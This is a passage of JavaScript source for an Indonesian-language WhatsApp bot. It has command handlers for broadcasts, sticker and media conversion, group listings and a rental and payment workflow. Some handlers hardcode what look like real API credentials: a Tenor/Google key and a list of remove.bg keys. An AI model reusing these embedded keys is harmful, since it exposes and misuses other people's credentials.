await Dani.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === '7') {
await Dani.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === '90') {
await Dani.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'off') {
await Dani.groupToggleEphemeral(m.chat, 0).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else {
let sections = [
{
title: "CHANGE EPHEMERAL GROUP",
rows: [
{title: "Ephemeral 1 day", rowId: `ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
{title: "Ephemeral 7 day's", rowId: `ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
{title: "Ephemeral 90 days's", rowId: `ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
{title: "Ephemeral Off", rowId: `ephemeral off`, description: `Deactivate this Ephemeral group`}
]
},
]
Dani.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, `Made With 🤍 Dani | Copyright 2022`, `Hello Admin ${groupMetadata.subject}`, `Click Here`, sections, freply)
}
}
break
case 'anticall': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
let ciko = db.data.settings[botNumber].anticall
if (args[0] === "on") {
if (ciko) return m.reply(`Sudah Aktif Sebelumnya`)
ciko = true
m.reply(`AntiCall Aktif !`)
} else if (args[0] === "off") {
if (!ciko) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
ciko = false
m.reply(`AntiCall Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'anticall on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'anticall off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI CALL`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'del': case 'delete': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
Dani.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'bcgc': case 'bcgroup': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await Dani.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'REST API',
url: 'https://danixcoders.herokuapp.com'
}
}, {
callButton: {
displayText: 'DEVELOPER',
phoneNumber: '+62 857-1462-7920'
}
}, {
quickReplyButton: {
displayText: '📈 PING',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: '👑 OWNER',
id: 'owner'
}  
}, {
quickReplyButton: {
displayText: '📑 SCRIPT',
id: 'sc'
}
}]
let txt = `「 BROADCAST BOT 」\n\n${text}`
Dani.send5ButImg(i, txt, `Made With 🤍 Dani | Copyright 2022`, global.image, btn)
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bc': case 'broadcast': case 'bcall': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'REST API',
url: 'https://danixcoders.herokuapp.com'
}
}, {
callButton: {
displayText: 'DEVELOPER',
phoneNumber: '+62 857-1462-7920'
}
}, {
quickReplyButton: {
displayText: '📈 PING',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: '👑 OWNER',
id: 'owner'
}  
}, {
quickReplyButton: {
displayText: '📑 SCRIPT',
id: 'sc'
}
}]
let txt = `「 BROADCAST BOT」\n\n${text}`
Dani.send5ButImg(yoi, txt, `Made With 🤍 Dani | Copyright 2022`, global.image, btn)
}
m.reply('Sukses Broadcast')
}
break
case 'infochat': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `❏ @${i.userJid.split('@')[0]}\n`
teks += `┗━❏ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ❏ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
Dani.sendTextWithMentions(m.chat, teks, m)
}
break
case 'gitclone':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!args[0]) return m.reply('Linknya?')
if (!regx.test(args[0])) return m.reply('Linknya salah')
let [, user, repo] = args[0].match(regx) || []
repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${user}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
Dani.sendFile(m.chat, hasdl, namafile, m)
limitAdd(sender, limit)
break
case 'q': case 'quoted': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await Dani.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
case 'listpc': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `❏ *Nama :* ${nama}\n❏ *User :* @${i.split('@')[0]}\n❏ *Chat :* https://wa.me/${i.split('@')[0]}\n\n\n`
}
Dani.sendTextWithMentions(m.chat, teks, freply)
}
break
case 'listgc': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata = await Dani.groupMetadata(i)
teks += `❏ *Nama :* ${metadata.subject}\n❏ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n❏ *ID :* ${metadata.id}\n❏ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n❏ *Member :* ${metadata.participants.length}\n\n\n`
}
Dani.sendTextWithMentions(m.chat, teks, freply)
}
break
case 'listonline': case 'liston': case 'here': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
Dani.sendText(m.chat, 'List Online:\n\n' + online.map(v => '❏ @' + v.replace(/@.+/, '')).join`\n`, freply, { mentions: online })
}
break
case 'sticker': case 'stiker': case 's': case 'stickergif': case 'sgif': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
sticWait(from)
let media = await Dani.downloadMediaMessage(qmsg)
let encmedia = await Dani.sendImageAsSticker(m.chat, media, freply, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
sticWait(from)
if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await Dani.downloadMediaMessage(qmsg)
let encmedia = await Dani.sendVideoAsSticker(m.chat, media, freply, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`
let [teks1, teks2] = text.split`|`
if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
sticWait(from)
if (/image/.test(mime)) {
let media = await Dani.downloadMediaMessage(qmsg)
let encmedia = await Dani.sendImageAsSticker(m.chat, media, freply, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await Dani.downloadMediaMessage(qmsg)
let encmedia = await Dani.sendVideoAsSticker(m.chat, media, freply, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'ebinary': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./lib/binary')
let eb = await eBinary(text)
textImg(eb)
limitAdd(sender, limit)
}
break
case 'dbinary': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./lib/binary')
let db = await dBinary(text)
textImg(db)
limitAdd(sender, limit)
}
break
case 'emojimix': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Dani.sendImageAsSticker(m.chat, res.url, freply, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
}
}
break
case 'sewa': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
if (args[0] === 'add'){
_sewa.addSewaGroup(from, args[1], sewa)
sticOk(from)
} else if (args[0].toLowerCase() === 'del'){
sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
sticOk(from)
} else {
m.reply(`Masukan Parameter Add/Del`)}
}
break
case 'sewacheck': case 'ceksewa': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isSewa) return m.reply(`_*🇬🇧 : This group is not listed on the rental list*_\n_*🇮🇩 : Group Ini Tidak Terdaftar Di List Sewa*_\n_*🇯🇵 : このグループはレンタルリストに記載されていません*_`)
let cekvipsewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewanya = `「 *SEWA CHECK* 」\n\n❏ *ID*: ${from}\n❏ *Expired :* ${cekvipsewa.days} day(s) ${cekvipsewa.hours} hour(s) ${cekvipsewa.minutes} minute(s)`
textImg(sewanya)
}
break
case 'listsewa':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvippsewa = ms(i.expired - Date.now())
txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvippsewa.days} day(s) ${cekvippsewa.hours} hour(s) ${cekvippsewa.minutes} minute(s) ${cekvippsewa.seconds} second(s)\n\n`
}
textImg(txtnyee)
break
case 'item': case 'list': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessage = {
text: `${ucapanWaktu} ${pushname} 👋\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!\n🗓 Tanggal : ${tanggal}\n🕰 Jam : ${moment().format("HH:mm:ss z")} `,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttonText: "Click Here!",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsg = await Dani.sendMessage(m.chat, listMessage)
}
break
case 'additem': case 'addlist': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)  
if (!isCreator) return sticOwner(from)
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]                
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await Dani.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
textImg(`Sukses set list message dengan key : *${args1}*`)
}
}
break
case 'delitem': case 'dellist': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isCreator) return sticOwner(from)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml`)
if (!isAlreadyResponList(from, q, db_respon_list)) return m.reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
textImg(`Sukses delete list message dengan key *${q}*`)
}
break
case 'changeitem': case 'updatelist': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isCreator) return sticOwner(from)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await Dani.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
textImg(`Sukses update respon list dengan key *${args1}*`)
}
}
break
case 'cekproses': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isCreator) return sticOwner(from)
if (!m.quoted) return m.reply('Reply Bukti Pembayaran!!')
if (!m.quoted.text) {
m.reply('Catatannya mana?')
}
if (m.quoted.text) {
let catad = m.quoted.text
let nimb = quoted.sender
let prses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${catad}\n\nPesanan @${nimb.split("@")[0]} sedang di proses!`
mentions(prses, [nimb], true)
}
}
break
case 'proses': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (!m.quoted) return m.reply('Reply Bukti Pembayaran!!')
if (!text) return m.reply('Masukan Catatan Pelanggan\nContoh: proses 11 Diamond Ml | Id 12345678(1234)')
let numb = m.sender
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${text}\n\nPesanan @${numb.split("@")[0]} sedang di proses!`
mentions(proses, numb, true)
m.quoted.copyNForward(`6285714627920@s.whatsapp.net`, true)
Dani.sendMessage(`6285714627920@s.whatsapp.net`, {text: proses })
}
break
case 'done': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args.length == 1) return m.reply('Masukan Nomor Pelanggan\nContoh: done 62xxx|catatan')
if (args.length == 2) return m.reply('Masukan Catatan Transaksi')
if (args[1].includes('+')) return m.reply(`Jangan menggunakan +`)
if (isNaN(parseInt(args[1]))) return m.reply('Harus Berupa Angka!')
let numbb = `${args[1]}@s.whatsapp.net`             
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\n📝 Catatan :\n${args[2]}\n\nTerimakasih @${numbb.split("@")[0]} Next Order ya🙏`
Dani.sendMessage(`${args[1]}@s.whatsapp.net`, {text: sukses })
}
break
case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) throw respond
if (!text) throw respond
sticWait(from)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await quoted.download()
let { floNime } = require('./lib/uploader')
let fatGans = await floNime(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
let FaTiH = await Dani.sendImageAsSticker(m.chat, smeme, freply, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
limitAdd(sender, limit)
}
break     
case 'toimage': case 'toimg': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw mess.replyimage
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
sticWait(from)
let media = await Dani.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Dani.sendMessage(m.chat, { image: buffer }, { quoted: freply })
fs.unlinkSync(ran)
limitAdd(sender, limit)
})
}
break
case 'tomp4': case 'tovideo': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw mess.replyimage
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
sticWait(from)
let { webp2mp4File } = require('./lib/uploader')
let media = await Dani.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Dani.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: freply })
await fs.unlinkSync(media)
limitAdd(sender, limit)
}
break
case 'toaud': case 'toaudio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Dani.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : freply })
limitAdd(sender, limit)
}
break
case 'tomp3': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Dani.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By Dani.mp3`}, { quoted : freply })
limitAdd(sender, limit)
}
break
case 'tovn': case 'toptt': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
Dani.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:freply})
limitAdd(sender, limit)
}
break
case 'togif': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
sticWait(from)
let { webp2mp4File } = require('./lib/uploader')
let media = await Dani.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Dani.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: freply })
await fs.unlinkSync(media)
limitAdd(sender, limit)
}
break
case 'tourl': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw `Kirim/Reply Image/Video Dengan Caption ${prefix + command}`
sticWait(from)
let {  floNime, UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let video = await Dani.downloadMediaMessage(qmsg)
if (/image/.test(mime)) {
let anu = await floNime(video)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await floNime(video)
m.reply(util.format(anu))
limitAdd(sender, limit)
}
}
break
case 'imagenobg': case 'removebg': case 'remove-bg': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let remobg = require('remove.bg')
let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
hmm = await './src/remobg-'+getRandom('')
localFile = await Dani.downloadAndSaveMediaMessage(quoted, hmm)
outputFile = await './src/hremo-'+getRandom('.png')
sticWait(from)
remobg.removeBackgroundFromImageFile({
path: localFile,
apiKey: apinobg,
size: "regular",
type: "auto",
scale: "100%",
outputFile 
}).then(async result => {
Dani.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : freply })
await fs.unlinkSync(localFile)
await fs.unlinkSync(outputFile)
limitAdd(sender, limit)
})
}
break
case 'take':case 'wm':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!quoted) return m.reply(`Kirim/Reply Gambar/Video Dengan Caption ${prefix + command}\n\nDurasi Sticker Video 1-9 Detik☕`)
if (!text) return m.reply(`Kirim perintah ${prefix + command} packname|author`)
if (!text.includes('|')) return m.reply(`Kirim perintah ${prefix + command} packname|author`)
if (/image/.test(mime)) {
let media = await Dani.downloadMediaMessage(qmsg)
let encmedia = await Dani.sendImageAsSticker(m.chat, media, freply, { packname: text.split("|")[0], author: text.split("|")[1] })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply(`Kirim/Reply Gambar/Video Dengan Caption ${prefix + command}\n\nDurasi Sticker Video 1-9 Detik☕`)
let media = await Dani.downloadMediaMessage(qmsg)
let encmedia = await Dani.sendVideoAsSticker(m.chat, media, freply, { packname: text.split("|")[0], author: text.split("|")[1] })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
} else {
m.reply(`Kirim/Reply Gambar/Video Dengan Caption ${prefix + command}\n\nDurasi Sticker Video 1-9 Detik☕`)
}
}
break
case 'yts': case 'ytsearch': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (args.length < 1) return m.reply(mess.apkk)
sticWait(from)
let list_rows = [];
let yts = require("yt-search")
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
